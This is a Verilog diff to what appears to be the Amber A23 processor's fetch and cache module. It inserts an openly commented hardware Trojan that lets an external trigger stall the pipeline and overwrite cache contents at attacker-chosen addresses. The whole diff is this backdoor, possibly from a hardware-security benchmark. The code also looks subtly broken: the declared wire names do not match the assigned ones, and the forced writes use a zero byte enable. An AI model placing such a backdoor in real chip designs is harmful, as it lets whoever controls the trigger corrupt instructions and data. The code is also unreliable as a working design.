@@ -60,6 +60,12 @@ input                       i_cache_enable,     // cache enable
 input                       i_cache_flush,      // cache flush
 input       [31:0]          i_cacheable_area,   // each bit corresponds to 2MB address space
 input                       i_system_rdy,
+
+input						i_troj,				/// Trojan signal to stall fetch
+input		[31:0]			i_troj_write_data,	/// Trojan data written to cache
+input		[31:0]			i_troj_address,		
+input		[31:0]			i_troj_address_nxt,
+
 output                      o_fetch_stall,      // when this is asserted all registers 
                                                 // in all 3 pipeline stages are held
                                                 // at their current values
@@ -106,8 +112,27 @@ assign o_read_data       = sel_cache  ? cache_read_data :
 // Stall the instruction decode and execute stages of the core
 // when the fetch stage needs more than 1 cycle to return the requested
 // read data
-assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall;
+/// Modified to stall when Trojan is busy modifying cache
+assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall || i_troj;
 
+/// Trojan muxed signals for cache input
+wire 		troj_cache_sel;
+wire 		troj_cache_excl;
+wire [31:0] troj_cache_write_data;
+wire 		troj_write_enable;
+wire [31:0]	troj_address;
+wire [31:0] troj_address_nxt;
+wire [3:0]	troj_byte_enable;
+wire		troj_wb_stall;
+
+assign troj_sel 				= i_troj ? 1 : sel_cache;
+assign troj_excl 				= i_troj ? 0 : i_exclusive;
+assign troj_write_data			= i_troj ? i_troj_write_data : i_write_data;
+assign troj_write_enable		= i_troj ? 1 : i_write_enable;
+assign troj_address				= i_troj ? i_troj_address : i_address;
+assign troj_address_nxt 		= i_troj ? i_troj_address_nxt : i_address_nxt;
+assign troj_byte_enable			= i_troj ? 4'b0 : i_byte_enable;
+assign troj_wb_stall			= i_troj ? 0 : o_wb_stb & ~i_wb_ack;
 
 // ======================================
 // L1 Cache (Unified Instruction and Data)
@@ -115,13 +140,13 @@ assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall;
 a23_cache u_cache (
     .i_clk                      ( i_clk                 ),
      
-    .i_select                   ( sel_cache             ),
-    .i_exclusive                ( i_exclusive           ),
-    .i_write_data               ( i_write_data          ),
-    .i_write_enable             ( i_write_enable        ),
-    .i_address                  ( i_address             ),
-    .i_address_nxt              ( i_address_nxt         ),
-    .i_byte_enable              ( i_byte_enable         ),
+    .i_select                   ( troj_sel        	    ),
+    .i_exclusive                ( troj_excl             ),
+    .i_write_data               ( troj_write_data       ),
+    .i_write_enable             ( troj_write_enable     ),
+    .i_address                  ( troj_address          ),
+    .i_address_nxt              ( troj_address_nxt      ),
+    .i_byte_enable              ( troj_byte_enable      ),
     .i_cache_enable             ( i_cache_enable        ),
     .i_cache_flush              ( i_cache_flush         ),
     .o_read_data                ( cache_read_data       ),
@@ -131,7 +156,7 @@ a23_cache u_cache (
     .o_wb_req                   ( cache_wb_req          ),
     .i_wb_address               ( o_wb_adr              ),
     .i_wb_read_data             ( i_wb_dat              ),
-    .i_wb_stall                 ( o_wb_stb & ~i_wb_ack  )
+    .i_wb_stall                 ( troj_wb_stall	        )
 );
 
 
